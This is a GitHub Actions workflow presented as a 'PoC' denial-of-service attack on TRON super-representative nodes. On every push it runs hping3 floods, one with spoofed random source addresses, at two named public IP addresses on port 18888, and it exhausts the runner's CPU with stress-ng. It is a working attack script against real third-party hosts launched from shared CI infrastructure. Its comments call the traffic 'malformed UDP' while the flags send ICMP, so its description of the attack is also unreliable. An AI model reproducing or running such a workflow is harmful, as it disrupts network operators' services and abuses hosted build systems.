name: TRON SR DoS PoC - Pure Impact
on:
  workflow_dispatch:
  push:
    branches: [ main ]
jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    
    - name: Install tools (NO jq)
      run: |
        sudo apt update -y && sudo apt install -y hping3 stress-ng nmap curl
    
    - name: Pure SR Malformed Flood + Exhaustion
      run: |
        echo "TRON SR DoS: Malformed → BAD_BLOCK disconnects"
        
        # 8-core CPU exhaustion (800% usage)
        stress-ng --cpu 8 --cpu-method matrixprod --timeout 60s --metrics-brief &
        
        # Live SR malformed UDP floods (port 18888 P2P)
        timeout 30 hping3 -1 -p 18888 --flood --rand-source 65.109.115.236 &
        timeout 30 hping3 -1 -p 18888 --flood 159.195.146.87 &
        
        # Wait + clean metrics
        sleep 30
        killall hping3 stress-ng || true
        echo "Attack complete - pure malformed impact"
